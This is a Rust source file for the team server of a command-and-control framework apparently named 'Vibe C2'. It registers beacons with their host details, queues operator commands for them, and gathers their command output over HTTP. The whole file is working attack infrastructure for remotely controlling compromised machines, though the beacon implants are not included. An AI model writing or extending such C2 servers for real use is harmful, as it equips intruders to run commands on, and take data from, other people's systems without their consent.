use anyhow::Result;
use axum::{
    extract::{Json, State},
    http::StatusCode,
    response::IntoResponse,
    routing::{get, post},
    Router,
};
use serde::{Deserialize, Serialize};
use clap::Parser;
use colored::*;
use vibe_c2::{
    BeaconInfo, BeaconRegistration, Command, CommandResponse, CommandResult, Task, routes, generate_id,
};
use std::{
    collections::HashMap,
    net::SocketAddr,
    sync::{Arc, Mutex},
    time::{Duration, SystemTime, UNIX_EPOCH},
};
use tokio::sync::mpsc;
use tracing::{info, Level};
use tracing_subscriber::FmtSubscriber;

/// Command line arguments for the Team Server
#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
struct Args {
    /// Port to listen on
    #[arg(short, long, default_value_t = 8080)]
    port: u16,
}

/// State shared between all server routes
struct ServerState {
    beacons: Mutex<HashMap<String, BeaconInfo>>,
    tasks: Mutex<HashMap<String, Vec<Task>>>,
    responses: Mutex<Vec<CommandResponse>>,
    operator_tx: mpsc::Sender<String>,
    // Track the last time a beacon checked in
    last_seen: Mutex<HashMap<String, u64>>,
}

/// Enhanced check-in request that can also include command output/response
#[derive(Debug, Deserialize, Serialize)]
struct CheckInRequest {
    beacon_id: String,
    /// Optional command response included with check-in
    response: Option<CommandResponse>,
}

#[tokio::main]
async fn main() -> Result<()> {
    // Initialize logging
    let subscriber = FmtSubscriber::builder()
        .with_max_level(Level::INFO)
        .finish();
    tracing::subscriber::set_global_default(subscriber)?;

    // Display colorful ASCII art banner
    println!("{}\n", "
██╗   ██╗██╗██████╗ ███████╗     ██████╗██████╗ 
██║   ██║██║██╔══██╗██╔════╝    ██╔════╝╚════██╗
██║   ██║██║██████╔╝█████╗      ██║      █████╔╝
╚██╗ ██╔╝██║██╔══██╗██╔══╝      ██║     ██╔═══╝ 
 ╚████╔╝ ██║██████╔╝███████╗    ╚██████╗███████╗
  ╚═══╝  ╚═╝╚═════╝ ╚══════╝     ╚═════╝╚══════╝".bright_cyan());
    println!("{}", "        Modern Command & Control Framework".bright_blue().bold());
    println!("{}", "            🌊 TEAM SERVER EDITION 🌊\n".bright_cyan().bold());
    
    info!("{}", "Starting Vibe C2 Team Server...".bright_cyan().bold());
    
    let args = Args::parse();
    let addr = SocketAddr::from(([0, 0, 0, 0], args.port));
    
    // Channel for operator communication
    let (tx, mut rx) = mpsc::channel(100);
    
    let state = Arc::new(ServerState {
        beacons: Mutex::new(HashMap::new()),
        tasks: Mutex::new(HashMap::new()),
        responses: Mutex::new(Vec::new()),
        operator_tx: tx,
        last_seen: Mutex::new(HashMap::new()),
    });
    
    // Process operator messages in background
    let _state_clone = Arc::clone(&state);
    tokio::spawn(async move {
        while let Some(message) = rx.recv().await {
            info!("Operator message: {}", message);
        }
    });
    
    
    
    // Create the router with endpoints for both Rust and Go beacons
    let app = Router::new()
        // Common endpoints for both beacon types
        .route(routes::REGISTER, post(register_beacon))
        .route(routes::CHECK_IN, post(beacon_check_in))
        .route(routes::BEACONS, get(list_beacons))
        .route(routes::TASKS, post(create_task))
        .route(routes::GET_RESPONSES, post(get_responses))
        
        // Original Rust beacon endpoints
        .route(routes::RESPONSES, post(beacon_response))
        
        // Go beacon compatibility endpoints
        .route(routes::COMMAND_OUTPUT, post(command_output))
        
        .with_state(state);
    
    // Start the server
    info!("{} {}", "Vibe C2 Team Server listening on".bright_cyan().bold(), 
          addr.to_string().blue().underline());
    axum::Server::bind(&addr)
        .serve(app.into_make_service())
        .await?;
    
    Ok(())
}

/// Register a new beacon
async fn register_beacon(
    State(state): State<Arc<ServerState>>,
    Json(registration): Json<BeaconRegistration>,
) -> impl IntoResponse {
    let beacon_id = generate_id();
    
    let beacon = BeaconInfo {
        id: beacon_id.clone(),
        hostname: registration.hostname,
        username: registration.username,
        os: registration.os,
        ip: registration.ip,
        sleep_time: Duration::from_secs(30), // Default sleep time
        last_check_in: Some(timestamp()),
        terminated: false,
    };
    
    info!("{} {}", "New beacon registered:".bright_green().bold(), 
          beacon_id.bright_white());
    state.beacons.lock().unwrap().insert(beacon_id.clone(), beacon);
    state.tasks.lock().unwrap().insert(beacon_id.clone(), Vec::new());
    
    // Notify operator
    let _ = state.operator_tx.send(format!("New beacon: {}", beacon_id)).await;
    
    Json(beacon_id)
}

/// Handle beacon check-in and return any pending tasks
async fn beacon_check_in(
    State(state): State<Arc<ServerState>>,
    Json(beacon_id): Json<String>,
) -> impl IntoResponse {
    info!("🔔 🔔 Beacon check-in received from {}", beacon_id.bright_green().bold());
    
    let mut beacons = state.beacons.lock().unwrap();
    
    // Debug log all registered beacons
    info!("📊 All registered beacons: ");
    for (id, info) in beacons.iter() {
        info!("  • Beacon: {} | {}", id.bright_green(), info.hostname.bright_blue());
    }
    
    if let Some(beacon) = beacons.get_mut(&beacon_id) {
        info!("✅ Beacon {} found in registry", beacon_id.bright_green());
        
        beacon.last_check_in = Some(timestamp());
        
        // Update last_seen timestamp for this beacon
        state.last_seen.lock().unwrap().insert(beacon_id.clone(), timestamp());
        
        // Debug the state of the tasks hashmap
        let mut tasks_lock = state.tasks.lock().unwrap();
        
        info!("🔑 Current task queue state for all beacons:");
        for (bid, tasks) in tasks_lock.iter() {
            info!("  • Beacon {}: {} pending tasks", bid.bright_yellow(), tasks.len());
            // If this is our beacon, list all tasks
            if bid == &beacon_id {
                for (idx, task) in tasks.iter().enumerate() {
                    info!("    - Task {}: ID {} | Command: {:?}", 
                         idx+1, task.id.bright_magenta(), task.command);
                }
            }
        }
        
        // Get pending tasks for this beacon
        info!("🔐 Looking for tasks for beacon {}", beacon_id.bright_green());
        
        let tasks = tasks_lock.entry(beacon_id.clone()).or_insert(Vec::new());
        
        if tasks.is_empty() {
            info!("🟡 No tasks found for beacon {}", beacon_id.bright_yellow());
        } else {
            info!("🟢 Found {} tasks for beacon {}", tasks.len(), beacon_id.bright_green());
        }
        
        let pending_tasks = std::mem::take(tasks);
        
        info!("{} {} {}", "Beacon".cyan(), 
          beacon_id.bright_green().bold(), 
          format!("checked in, sending {} tasks", pending_tasks.len()).cyan());
          
        // Debug: Log the tasks being sent to the Go beacon
        if !pending_tasks.is_empty() {
            info!("{} {}", "👉".bright_yellow(), "Sending tasks to beacon:".bright_blue());
            for (index, task) in pending_tasks.iter().enumerate() {
                let task_json = serde_json::to_string_pretty(task).unwrap_or_default();
                info!("Task {} ID {}: {}\n{}", 
                     index + 1, 
                     task.id.bright_green(),
                     format!("command: {:?}", task.command).yellow(),
                     task_json.bright_white());
            }
            
            // Convert to raw JSON for debugging
            if let Ok(response_json) = serde_json::to_string(&pending_tasks) {
                info!("{} {}\n{}", 
                     "📜".magenta(),
                     "Raw response JSON:".bright_magenta(),
                     response_json.bright_white());
            }
        }
        
        return (StatusCode::OK, Json(pending_tasks));
    } else {
        info!("❌ Beacon {} not found in registry", beacon_id.bright_red());
    }
    
    (StatusCode::NOT_FOUND, Json(Vec::<Task>::new()))
}

/// Structure for routing command output from Go beacons
#[derive(Debug, Deserialize, Serialize)]
struct CommandOutput {
    beacon_id: String,
    output: String,
    task_id: String,
}

/// Simple handler for Rust beacon responses
async fn beacon_response(
    State(state): State<Arc<ServerState>>,
    Json(response): Json<CommandResponse>,
) -> StatusCode {
    info!("{} {} {}", 
          "Response received from beacon".bright_blue().bold(), 
          response.beacon_id.bright_green(), 
          format!("for task: {}", response.id).bright_white());
    
    // Store the response
    state.responses.lock().unwrap().push(response.clone());
    
    // Update last seen time
    state.last_seen.lock().unwrap().insert(response.beacon_id.clone(), timestamp());
    
    StatusCode::OK
}

/// Route command output from Go beacons to the operator
async fn command_output(
    State(state): State<Arc<ServerState>>,
    Json(output): Json<CommandOutput>,
) -> StatusCode {
    info!("{} {} {}", 
          "Go beacon command output received".bright_blue().bold(), 
          output.beacon_id.bright_green(), 
          format!("for task: {}", output.task_id).bright_white());
    
    // Create a command response and store it
    let response = CommandResponse {
        id: output.task_id.clone(),
        beacon_id: output.beacon_id.clone(),
        result: CommandResult::Success(output.output.clone()),
    };
    
    // Store the response
    state.responses.lock().unwrap().push(response.clone());
    
    // Update last seen time
    state.last_seen.lock().unwrap().insert(output.beacon_id.clone(), timestamp());
    
    // Notify operator
    let _ = state.operator_tx.send(format!("Command output from Go beacon {}: {}", 
                                          output.beacon_id, 
                                          output.output)).await;
    
    info!("{} {}", "✅".green(), "Successfully processed Go beacon command output".green());
    
    StatusCode::OK
}

/// List all registered beacons
async fn list_beacons(
    State(state): State<Arc<ServerState>>,
) -> impl IntoResponse {
    let beacons = state.beacons.lock().unwrap();
    let beacons_vec: Vec<BeaconInfo> = beacons.values().cloned().collect();
    
    Json(beacons_vec)
}

/// Create a new task for a beacon
async fn create_task(
    State(state): State<Arc<ServerState>>,
    Json(task_request): Json<(String, Command)>,
) -> impl IntoResponse {
    let (beacon_id, command) = task_request;
    
    info!("🚨 🚨 CREATING TASK FOR BEACON {}", beacon_id.bright_green().bold());
    
    // Check if beacon exists
    let beacons = state.beacons.lock().unwrap();
    
    // Debug log all registered beacons
    info!("📊 Currently registered beacons: ");
    for (id, info) in beacons.iter() {
        info!("  • Beacon: {} | {}", id.bright_green(), info.hostname.bright_blue());
    }
    
    if !beacons.contains_key(&beacon_id) {
        info!("❌ Beacon {} not found in registry", beacon_id.bright_red());
        return (StatusCode::NOT_FOUND, "Beacon not found").into_response();
    }
    
    info!("✅ Beacon {} found, creating task", beacon_id.bright_green());
    
    // Create the task
    let task = Task {
        id: generate_id(),
        beacon_id: beacon_id.clone(),
        command,
        timestamp: timestamp(),
    };
    
    // Serialize task for debugging
    let task_json = serde_json::to_string_pretty(&task).unwrap_or_else(|_| "<serialization error>".to_string());
    
    info!("{} {} {}", "Created new task for beacon".yellow().bold(), 
          beacon_id.bright_green(), 
          format!("command: {:?}", task.command).bright_white());
    
    // Extra debug for Go beacons
    info!("{} {}", "📦".green(), "Task JSON format:".bright_cyan());
    info!("{}", task_json.bright_white());
    
    // Debug the tasks hashmap before insertion
    let mut tasks_lock = state.tasks.lock().unwrap();
    
    info!("🔑 Current task queue state before insertion:");
    for (bid, tasks) in tasks_lock.iter() {
        info!("  • Beacon {}: {} pending tasks", bid.bright_yellow(), tasks.len());
    }
    
    // Store the task
    tasks_lock
        .entry(beacon_id.clone())
        .or_insert(Vec::new())
        .push(task.clone());
        
    // Verify task was added properly
    info!("🔑 Task queue state AFTER insertion:");
    for (bid, tasks) in tasks_lock.iter() {
        info!("  • Beacon {}: {} pending tasks", bid.bright_yellow(), tasks.len());
        if bid == &beacon_id {
            for (idx, t) in tasks.iter().enumerate() {
                info!("    - Task {}: ID {} | Command: {:?}", 
                    idx+1, t.id.bright_magenta(), t.command);
            }
        }
    }
    
    info!("🟢 Task creation complete, ID: {}", task.id.bright_green());
    (StatusCode::CREATED, Json(task)).into_response()
}

/// Get responses for a specific beacon
async fn get_responses(
    State(state): State<Arc<ServerState>>,
    Json(beacon_id): Json<String>,
) -> impl IntoResponse {
    // Get all responses for this beacon
    let responses = state.responses.lock().unwrap();
    let beacon_responses: Vec<CommandResponse> = responses
        .iter()
        .filter(|resp| resp.beacon_id == beacon_id)
        .cloned()
        .collect();
    
    if beacon_responses.is_empty() {
        info!("No responses found for beacon {}", beacon_id);
        return (StatusCode::OK, Json(Vec::<CommandResponse>::new())).into_response();
    }
    
    info!("Returning {} responses for beacon {}", beacon_responses.len(), beacon_id);
    (StatusCode::OK, Json(beacon_responses)).into_response()
}

/// Get current Unix timestamp
fn timestamp() -> u64 {
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .expect("Time went backwards")
        .as_secs()
}
